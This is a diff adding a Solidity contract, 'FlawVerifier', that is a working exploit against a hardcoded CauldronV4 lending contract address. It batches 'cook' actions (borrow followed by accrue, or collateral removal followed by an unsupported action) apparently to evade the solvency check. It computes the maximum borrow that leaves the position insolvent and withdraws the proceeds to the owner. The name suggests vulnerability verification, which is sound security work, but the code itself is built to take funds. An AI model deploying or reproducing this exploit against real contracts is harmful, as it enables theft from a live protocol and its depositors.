@@ -1,0 +1,441 @@
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IBentoBoxLike {
+    function balanceOf(address token, address account) external view returns (uint256);
+    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
+    function withdraw(
+        address token,
+        address from,
+        address to,
+        uint256 amount,
+        uint256 share
+    ) external returns (uint256 amountOut, uint256 shareOut);
+}
+
+interface ICauldronV4Like {
+    function cook(
+        uint8[] calldata actions,
+        uint256[] calldata values,
+        bytes[] calldata datas
+    ) external payable returns (uint256 value1, uint256 value2);
+
+    function bentoBox() external view returns (address);
+    function magicInternetMoney() external view returns (address);
+    function collateral() external view returns (address);
+    function isSolvent(address user) external view returns (bool);
+    function userBorrowPart(address user) external view returns (uint256);
+    function userCollateralShare(address user) external view returns (uint256);
+    function exchangeRate() external view returns (uint256);
+    function COLLATERIZATION_RATE() external view returns (uint256);
+    function BORROW_OPENING_FEE() external view returns (uint256);
+    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
+    function totalBorrow() external view returns (uint128 elastic, uint128 base);
+}
+
+contract FlawVerifier {
+    uint8 private constant ACTION_REMOVE_COLLATERAL = 4;
+    uint8 private constant ACTION_BORROW = 5;
+    uint8 private constant ACTION_ACCRUE = 8;
+
+    uint256 private constant BORROW_OPENING_FEE_PRECISION = 1e5;
+    uint256 private constant COLLATERIZATION_RATE_PRECISION = 1e5;
+    uint256 private constant EXCHANGE_RATE_PRECISION = 1e18;
+
+    ICauldronV4Like public constant TARGET = ICauldronV4Like(0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c);
+
+    address public immutable owner;
+
+    enum ExploitPath {
+        None,
+        BorrowThenAccrue,
+        RemoveThenUnsupported
+    }
+
+    ExploitPath public exploitPath;
+    uint256 public amountOrShare;
+    uint8 public unsupportedAction;
+    address public bentoReceiver;
+    address public payoutRecipient;
+    bool public withdrawAfter;
+
+    event Configured(
+        ExploitPath indexed path,
+        uint256 amountOrShare,
+        uint8 unsupportedAction,
+        address indexed bentoReceiver,
+        address indexed payoutRecipient,
+        bool withdrawAfter
+    );
+
+    event ExploitExecuted(
+        ExploitPath indexed path,
+        uint256 beforeBorrowPart,
+        uint256 afterBorrowPart,
+        uint256 beforeCollateralShare,
+        uint256 afterCollateralShare,
+        bool solventBefore,
+        bool solventAfter,
+        uint256 value1,
+        uint256 value2
+    );
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "not owner");
+        _;
+    }
+
+    constructor() {
+        owner = msg.sender;
+        bentoReceiver = address(this);
+        payoutRecipient = msg.sender;
+        unsupportedAction = type(uint8).max;
+    }
+
+    function configureBorrowThenAccrue(
+        uint256 borrowAmount,
+        address _bentoReceiver,
+        address _payoutRecipient,
+        bool _withdrawAfter
+    ) external onlyOwner {
+        require(borrowAmount > 0, "borrowAmount=0");
+        exploitPath = ExploitPath.BorrowThenAccrue;
+        amountOrShare = borrowAmount;
+        unsupportedAction = ACTION_ACCRUE;
+        bentoReceiver = _defaultReceiver(_bentoReceiver);
+        payoutRecipient = _defaultRecipient(_payoutRecipient);
+        withdrawAfter = _withdrawAfter;
+        require(!withdrawAfter || bentoReceiver == address(this), "receiver must be this");
+        emit Configured(exploitPath, amountOrShare, unsupportedAction, bentoReceiver, payoutRecipient, withdrawAfter);
+    }
+
+    function configureRemoveThenUnsupported(
+        uint256 collateralShare,
+        uint8 followupUnsupportedAction,
+        address _bentoReceiver,
+        address _payoutRecipient,
+        bool _withdrawAfter
+    ) external onlyOwner {
+        require(collateralShare > 0, "collateralShare=0");
+        require(_isUnsupportedAction(followupUnsupportedAction), "handled action");
+        exploitPath = ExploitPath.RemoveThenUnsupported;
+        amountOrShare = collateralShare;
+        unsupportedAction = followupUnsupportedAction;
+        bentoReceiver = _defaultReceiver(_bentoReceiver);
+        payoutRecipient = _defaultRecipient(_payoutRecipient);
+        withdrawAfter = _withdrawAfter;
+        require(!withdrawAfter || bentoReceiver == address(this), "receiver must be this");
+        emit Configured(exploitPath, amountOrShare, unsupportedAction, bentoReceiver, payoutRecipient, withdrawAfter);
+    }
+
+    function executeOnOpportunity() external {
+        if (exploitPath == ExploitPath.None) {
+            _autoConfigure();
+        }
+
+        uint256 beforeBorrowPart = TARGET.userBorrowPart(address(this));
+        uint256 beforeCollateralShare = TARGET.userCollateralShare(address(this));
+        bool solventBefore = TARGET.isSolvent(address(this));
+
+        uint8[] memory actions = new uint8[](2);
+        uint256[] memory values = new uint256[](2);
+        bytes[] memory datas = new bytes[](2);
+
+        if (exploitPath == ExploitPath.BorrowThenAccrue) {
+            actions[0] = ACTION_BORROW;
+            actions[1] = ACTION_ACCRUE;
+            datas[0] = abi.encode(_toInt256(amountOrShare), bentoReceiver);
+            datas[1] = bytes("");
+        } else {
+            actions[0] = ACTION_REMOVE_COLLATERAL;
+            actions[1] = unsupportedAction;
+            datas[0] = abi.encode(_toInt256(amountOrShare), bentoReceiver);
+            datas[1] = bytes("");
+        }
+
+        (uint256 value1, uint256 value2) = TARGET.cook(actions, values, datas);
+
+        if (withdrawAfter) {
+            _withdrawProceeds(value2);
+        }
+
+        uint256 afterBorrowPart = TARGET.userBorrowPart(address(this));
+        uint256 afterCollateralShare = TARGET.userCollateralShare(address(this));
+        bool solventAfter = TARGET.isSolvent(address(this));
+
+        emit ExploitExecuted(
+            exploitPath,
+            beforeBorrowPart,
+            afterBorrowPart,
+            beforeCollateralShare,
+            afterCollateralShare,
+            solventBefore,
+            solventAfter,
+            value1,
+            value2
+        );
+    }
+
+    function rescueToken(address token, address to) external onlyOwner {
+        uint256 balance = IERC20Like(token).balanceOf(address(this));
+        require(IERC20Like(token).transfer(to, balance), "transfer failed");
+    }
+
+    function rescueBentoShares(address token, address to, uint256 share) external onlyOwner {
+        IBentoBoxLike(TARGET.bentoBox()).withdraw(token, address(this), to, 0, share);
+    }
+
+    function _autoConfigure() internal {
+        uint256 currentBorrowPart = TARGET.userBorrowPart(address(this));
+        uint256 currentCollateralShare = TARGET.userCollateralShare(address(this));
+
+        bentoReceiver = address(this);
+        payoutRecipient = owner;
+        withdrawAfter = true;
+
+        if (currentBorrowPart != 0 && currentCollateralShare != 0) {
+            exploitPath = ExploitPath.RemoveThenUnsupported;
+            amountOrShare = currentCollateralShare;
+            unsupportedAction = type(uint8).max;
+            emit Configured(exploitPath, amountOrShare, unsupportedAction, bentoReceiver, payoutRecipient, withdrawAfter);
+            return;
+        }
+
+        require(currentCollateralShare != 0, "no position");
+
+        uint256 borrowAmount = _maxInsolventBorrowAmount(currentBorrowPart, currentCollateralShare);
+        require(borrowAmount != 0, "no exploit opportunity");
+
+        exploitPath = ExploitPath.BorrowThenAccrue;
+        amountOrShare = borrowAmount;
+        unsupportedAction = ACTION_ACCRUE;
+
+        emit Configured(exploitPath, amountOrShare, unsupportedAction, bentoReceiver, payoutRecipient, withdrawAfter);
+    }
+
+    function _maxInsolventBorrowAmount(uint256 currentBorrowPart, uint256 currentCollateralShare)
+        internal
+        view
+        returns (uint256)
+    {
+        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
+        address mim = TARGET.magicInternetMoney();
+
+        uint256 availableShare = bento.balanceOf(mim, address(TARGET));
+        uint256 liquidityAmount = bento.toAmount(mim, availableShare, false);
+        if (liquidityAmount == 0) {
+            return 0;
+        }
+
+        (uint128 totalCap, uint128 perAddressCap) = TARGET.borrowLimit();
+        (uint128 totalElastic128, uint128 totalBase128) = TARGET.totalBorrow();
+        uint256 totalElastic = uint256(totalElastic128);
+        uint256 totalBase = uint256(totalBase128);
+        uint256 openingFee = TARGET.BORROW_OPENING_FEE();
+
+        uint256 upper = liquidityAmount;
+        if (totalElastic >= uint256(totalCap)) {
+            return 0;
+        }
+
+        uint256 remainingElasticCap = uint256(totalCap) - totalElastic;
+        uint256 byTotalCap = _netAmountFromGrossCap(remainingElasticCap, openingFee);
+        if (byTotalCap < upper) {
+            upper = byTotalCap;
+        }
+        if (upper == 0) {
+            return 0;
+        }
+
+        uint256 low = 0;
+        uint256 high = upper;
+        while (low < high) {
+            uint256 mid = (low + high + 1) / 2;
+            if (_fitsBorrowCaps(mid, currentBorrowPart, totalElastic, totalBase, openingFee, perAddressCap)) {
+                low = mid;
+            } else {
+                high = mid - 1;
+            }
+        }
+
+        uint256 candidate = low;
+        if (candidate == 0) {
+            return 0;
+        }
+
+        if (
+            !_wouldBeInsolvent(
+                candidate,
+                currentBorrowPart,
+                currentCollateralShare,
+                totalElastic,
+                totalBase,
+                openingFee,
+                TARGET.exchangeRate(),
+                TARGET.COLLATERIZATION_RATE()
+            )
+        ) {
+            return 0;
+        }
+
+        return candidate;
+    }
+
+    function _fitsBorrowCaps(
+        uint256 amount,
+        uint256 currentBorrowPart,
+        uint256 totalElastic,
+        uint256 totalBase,
+        uint256 openingFee,
+        uint128 perAddressCap
+    ) internal pure returns (bool) {
+        uint256 grossBorrow = amount + (amount * openingFee) / BORROW_OPENING_FEE_PRECISION;
+        uint256 addedPart = _toBase(totalElastic, totalBase, grossBorrow, true);
+        return currentBorrowPart + addedPart <= uint256(perAddressCap);
+    }
+
+    function _wouldBeInsolvent(
+        uint256 amount,
+        uint256 currentBorrowPart,
+        uint256 currentCollateralShare,
+        uint256 totalElastic,
+        uint256 totalBase,
+        uint256 openingFee,
+        uint256 currentExchangeRate,
+        uint256 collateralizationRate
+    ) internal view returns (bool) {
+        uint256 grossBorrow = amount + (amount * openingFee) / BORROW_OPENING_FEE_PRECISION;
+        uint256 addedPart = _toBase(totalElastic, totalBase, grossBorrow, true);
+        uint256 newElastic = totalElastic + grossBorrow;
+        uint256 newBase = totalBase + addedPart;
+        uint256 newBorrowPart = currentBorrowPart + addedPart;
+
+        uint256 scaledCollateralShare = currentCollateralShare * (EXCHANGE_RATE_PRECISION / COLLATERIZATION_RATE_PRECISION);
+        uint256 collateralValue = IBentoBoxLike(TARGET.bentoBox()).toAmount(
+            TARGET.collateral(),
+            scaledCollateralShare * collateralizationRate,
+            false
+        );
+        uint256 debtAmount = _mulDiv(newBorrowPart, newElastic, newBase);
+        uint256 maxSolventDebtAmount = currentExchangeRate == 0 ? type(uint256).max : collateralValue / currentExchangeRate;
+
+        return maxSolventDebtAmount < debtAmount;
+    }
+
+    function _withdrawProceeds(uint256 borrowedMimShare) internal {
+        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
+
+        if (exploitPath == ExploitPath.BorrowThenAccrue) {
+            address mim = TARGET.magicInternetMoney();
+            uint256 share = borrowedMimShare;
+            if (share == 0) {
+                share = bento.balanceOf(mim, address(this));
+            }
+            if (share != 0) {
+                bento.withdraw(mim, address(this), payoutRecipient, 0, share);
+            }
+        } else {
+            address token = TARGET.collateral();
+            uint256 share = amountOrShare;
+            if (share == 0) {
+                share = bento.balanceOf(token, address(this));
+            }
+            if (share != 0) {
+                bento.withdraw(token, address(this), payoutRecipient, 0, share);
+            }
+        }
+    }
+
+    function _defaultReceiver(address candidate) internal view returns (address) {
+        return candidate == address(0) ? address(this) : candidate;
+    }
+
+    function _defaultRecipient(address candidate) internal view returns (address) {
+        return candidate == address(0) ? owner : candidate;
+    }
+
+    function _toInt256(uint256 value) internal pure returns (int256) {
+        require(value <= uint256(type(int256).max), "value too large");
+        return int256(value);
+    }
+
+    function _isUnsupportedAction(uint8 action) internal pure returns (bool) {
+        return action != 2 && action != 4 && action != 5 && action != 6 && action != 7 && action != 8 && action != 10
+            && action != 11 && action != 20 && action != 21 && action != 22 && action != 23 && action != 24
+            && action != 30 && action != 31;
+    }
+
+    function _netAmountFromGrossCap(uint256 grossCap, uint256 openingFee) internal pure returns (uint256) {
+        return _mulDiv(grossCap, BORROW_OPENING_FEE_PRECISION, BORROW_OPENING_FEE_PRECISION + openingFee);
+    }
+
+    function _toBase(uint256 totalElastic, uint256 totalBase, uint256 elastic, bool roundUp)
+        internal
+        pure
+        returns (uint256 base)
+    {
+        if (elastic == 0) {
+            return 0;
+        }
+        if (totalElastic == 0 || totalBase == 0) {
+            return elastic;
+        }
+
+        base = _mulDiv(elastic, totalBase, totalElastic);
+        if (roundUp && _mulDiv(base, totalElastic, totalBase) < elastic) {
+            base += 1;
+        }
+    }
+
+    function _mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
+        require(denominator != 0, "div by zero");
+        unchecked {
+            uint256 prod0;
+            uint256 prod1;
+            assembly {
+                let mm := mulmod(x, y, not(0))
+                prod0 := mul(x, y)
+                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
+            }
+
+            if (prod1 == 0) {
+                return prod0 / denominator;
+            }
+
+            require(denominator > prod1, "mulDiv overflow");
+
+            uint256 remainder;
+            assembly {
+                remainder := mulmod(x, y, denominator)
+                prod1 := sub(prod1, gt(remainder, prod0))
+                prod0 := sub(prod0, remainder)
+            }
+
+            uint256 twos = denominator & (~denominator + 1);
+            assembly {
+                denominator := div(denominator, twos)
+                prod0 := div(prod0, twos)
+                twos := add(div(sub(0, twos), twos), 1)
+            }
+
+            prod0 |= prod1 * twos;
+
+            uint256 inverse = (3 * denominator) ^ 2;
+            inverse *= 2 - denominator * inverse;
+            inverse *= 2 - denominator * inverse;
+            inverse *= 2 - denominator * inverse;
+            inverse *= 2 - denominator * inverse;
+            inverse *= 2 - denominator * inverse;
+            inverse *= 2 - denominator * inverse;
+
+            result = prod0 * inverse;
+            return result;
+        }
+    }
+
+    receive() external payable {}
+}
